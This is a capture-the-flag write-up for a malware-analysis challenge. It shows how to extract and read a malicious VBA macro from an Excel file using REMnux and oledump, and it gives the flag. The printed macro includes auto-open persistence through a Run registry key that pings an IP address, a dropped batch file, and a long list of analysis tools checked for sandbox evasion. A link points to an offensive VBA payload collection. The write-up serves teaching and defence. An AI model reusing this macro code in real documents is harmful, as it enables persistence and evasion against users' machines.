---
title: Total Wreck SpreadSheets
time: 2024-09-22
categories: [malware analysis]
tags: [medium, malware, document analysis]
image: /assets/posts/chall_category/malware-analysis.png
---

## Description:

The cybersecurity team has been notified of unusual network activity originating from the HR department. An Excel file titled **"Employee_Salaries_2024.xlsm"** has been shared internally, supposedly containing sensitive payroll information for the upcoming year. Some employees who accessed the file reported unexpected system issues soon afterward, prompting an investigation into whether the document may be linked to these incidents. As an malware analyst, your role is to analyze the Excel file and investigate its contents. There may be hidden elements within the file contributing to the unusual behavior on the network.

- Category: Malware Analysis
- **Flag:** CTF{flag}
- Password for challenge file: `infected`

<button onclick="downloadFile()">Download File</button>

<script>
function downloadFile() {
    const link = document.createElement('a');
    link.href = 'https://github.com/0x251e/challenges/raw/main/union-depository/malware-analysis/total-wreck-spreadsheets/a_total_wreck_challenge.zip';
    link.download = 'a_total_wreck_challenge.zip';
    link.click();
}
</script>

## Solutions:

#### 1. Use REMnux as your trusty malware analysis tool

![solve1](/assets/posts/chall-writeup-img/total-wreck-spreadsheets/solve1.png)

In REMnux, move the `a_total_wreck_challenge.zip` to your working directory and unzip it with the password `infected`.

As we noticed the extension of xlsm of the file, it indicates the file contains macros. Macros is a recorded sequences of actions or commands that is used to automated repetitive tasks. It is a common feature in Microsoft Office tools. Mostly, it is used for formatting text, applying styles and inserting content. For excel wise, it can be perform complex or repetitive calculations in order to generate report in a swift time. 

In addition to macros, Microsoft Office also supports scripting through Visual Basic for Applications (VBA), which allows users to create more advanced and customized macros. VBA is a programming language integrated into Office applications such as Excel, Word, and PowerPoint, enabling automation beyond simple tasks. 

#### 2. Determine any malicious VBA macros with oletimes

Analyze the embedded contents of the spreadsheets with OLE tools.

```
oleid Employee_Salaries_2024.xlsm
```

Output:

![solve2](/assets/posts/chall-writeup-img/total-wreck-spreadsheets/solve2.png)

Here we can noticed that this spreasheet documents contain VBA macros that are highly suspicious due to certain keywords used. Lets analyze on the keywords that is used. The next process will be extracting the embedded macros. 

#### 3. Analyze VBA macros from the spreadsheets

```
oledump.py Employee_Salaries_2024.xlsm
```

Output:

![solve3](/assets/posts/chall-writeup-img/total-wreck-spreadsheets/solve3.png)

Here we can noticed a capital **M** on `A3: M 7064 'VBA/Module1` which is a stream. Always take note on the **M** and **m** where **M** means that the macro is compressed where else **m** means is uncompressed, it could be metadata which is easier to analyze

#### 4. Extracting macro 

```
oledump.py Employee_Salaries_2024.xlsm -s 3
```
Output:

![solve4](/assets/posts/chall-writeup-img/total-wreck-spreadsheets/solve4.png)

The output will return a hex bytes format of the macros which is difficult to analyze, however it contain some visible string. 

```
oledump.py Employee_Salaries_2024.xlsm -s 3 -S --vbadecompresscorrupt
```
Output:

![solve5](/assets/posts/chall-writeup-img/total-wreck-spreadsheets/solve5.png)

We can easily view the VBA script easily, now piped it to text file to analyze further for the flag.

#### 5. Analyzing malicious VBA scipt

```
Attribute VB_Name = "Module1"
Sub Document_Open()
    OldStartup = CreateObject("WScript.Shell").SpecialFolders("Startup")
    NewStartup = Replace(OldStartup, "Startup", "lolz")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FolderExists(NewStartup) = False Then
    Name OldStartup As NewStartup
    Set objFile = objFSO.CreateTextFile(Path & "\dHJ5cGVyaGFwcw.bat", True)
    objFile.Write "cmd.exe"
    objFile.Close
    Name NewStartup As OldStartup
End If
    EvilMacro
End Sub
Sub AutOpen()
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Persist", "cmd.exe /C ping 183.81.169.238", "REG_SZ"
    EvilMacro
End Sub
Sub EvilMacro()
Function SearchProcesses()
  FtfIrLKSv=Array("cis.exe","cmdvirth.exe","alive.exe","filewatcherservice.exe","ngvmsvc.exe","sandboxierpcss.exe","analyzer.exe", \
                  "fortitracer.exe","nsverctl.exe","sbiectrl.exe","angar2.exe","goatcasper.exe","ollydbg.exe","sbiesvc.exe", \
                  "apimonitor.exe", "GoatClientApp.exe","peid.exe","scanhost.exe","apispy.exe","hiew32.exe","perl.exe","scktool.exe", \
                  "apispy32.exe","hookanaapp.exe","petools.exe","sdclt.exe","asura.exe","hookexplorer.exe","pexplorer.exe", \
                  "sftdcc.exe","autorepgui.exe","httplog.exe","ping.exe","shutdownmon.exe","autoruns.exe","icesword.exe","pr0c3xp.exe", \
                  "sniffhit.exe","autorunsc.exe","iclicker-release.exe",".exe","prince.exe","snoop.exe","autoscreenshotter.exe","idag.exe", \
                  "procanalyzer.exe", "spkrmon.exe","avctestsuite.exe","idag64.exe","processhacker.exe","sysanalyzer.exe","avz.exe", \
                  "idaq.exe","processmemdump.exe","syser.exe","behaviordumper.exe","immunitydebugger.exe","procexp.exe","systemexplorer.exe", \
                  "bindiff.exe","importrec.exe","procexp64.exe","systemexplorerservice.exe","BTPTrayIcon.exe","imul.exe","procmon.exe", \
                  "sython.exe", "capturebat.exe","Infoclient.exe","procmon64.exe","taskmgr.exe","cdb.exe","installrite.exe","python.exe", \
                  "taslogin.exe","cffexplorer.exe","ipfs.exe","pythonw.exe","tcpdump.exe","clicksharelauncher.exe","iprosetmonitor.exe","qq.exe", \
                  "tcpview.exe","closepopup.exe","iragent.exe","qqffo.exe","timeout.exe","commview.exe","iris.exe","qqprotect.exe", \
                  "totalcmd.exe","cports.exe","joeboxcontrol.exe","qqsg.exe","trojdie.kvpcrossfire.exe","joeboxserver.exe", \
                  "raptorclient.exe","txplatform.exe","dnf.exe"," lamer.exe","regmon.exe","virus.exe","dsniff.exe","LogHTTP.exe","regshot.exe", \
                  "vx.exe","dumpcap.exe", "lordpe.exe","RepMgr64.exe","winalysis.exe","emul.exe","malmon.exe","RepUtils32.exe","winapioverride32.exe", \
                  "ethereal.exe","mbarun.exe","RepUx.exe","windbg.exe","ettercap.exe","mdpmon.exe","runsample.exe","windump.exe", \
                  "fakehttpserver.exe","mmr.exe","samp1e.exe","winspy.exe","fakeserver.exe","mmr.exe","sample.exe","wireshark.exe", \
                  "Fiddler.exe","multipot.exe","sandboxiecrypto.exe","XXX.exe","filemon.exe","netsniffer.exe","sandboxiedcomlaunch.exe")
  Set VRfvQEHCs = GetObject("winmgmts:\\.\root\cimv2")
  Set uxSpQuH = VRfvQEHCs.ExecQuery("Select * from Win32_Process")
  For Each XqDiZDh In uxSpQuH
    For Each CMUDEKiI In FtfIrLKSv
      If XqDiZDh.Name = CMUDEKiI Then
        wscript.Echo "Q1RGe0hSX2cwdF93UjNrZH0"
      End If
    Next
  Next
End Function
```

In the VBA script, it contain code that creates a registry under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` and it execute command to ping to `183.81.169.238`. We could check the activity of the IP address.

![solve6](/assets/posts/chall-writeup-img/total-wreck-spreadsheets/solve6.png)

With `AutOpen`, the script will runs automatically when the document is opened. Moreover, it contains a list of exe in an array which has the name of `Function SearchProcess()` which checks for common security tools. This means the malware is checking on whether it is in a monitoring enviroment. If it detects from WMI, it echoes a string `"Q1RGe0hSX2cwdF93UjNrZH0"`, lets take note on that. Finally, there is a code where is rename existing Startup folder to `test` and creates a batch file of `dHJ5cGVyaGFwcw.bat` and having the `cmd.exe` to execute it. Now we have two possible string contain flag-lookalike text, base64 indeed.

#### 6. Decode base64 string

```
echo "Q1RGe0hSX2cwdF93UjNrZH0" | base64 -d 
```

Output: CTF{HR\_g0t\_wR3kd}

**Flag:** `CTF{HR_g0t_wR3kd}`

## Challenge Creation: 

I have planned out in detail, will attach an md file for it. (Attachments: [READMe.md](https://github.com/0x251e/challenges/blob/main/union-depository/malware-analysis/total-wreck-spreadsheets/READMe.md)

TL;DR:
- Windows 10
- Excel spreadsheet (enable macros)
- Use [payloads](https://github.com/S3cur3Th1sSh1t/OffensiveVBA/)
- Use remnux test challenge file

References:
- [https://fareedfauzi.github.io/2024/04/20/Maldoc-Cheatsheet.html](https://fareedfauzi.github.io/2024/04/20/Maldoc-Cheatsheet.html)
- [medium post](https://socfortress.medium.com/malicious-macros-detection-in-ms-office-files-using-olevba-752ed6b48c04)
- [medium post](https://medium.com/@malwaredev/macros-in-malware-development-db426dc0f065)


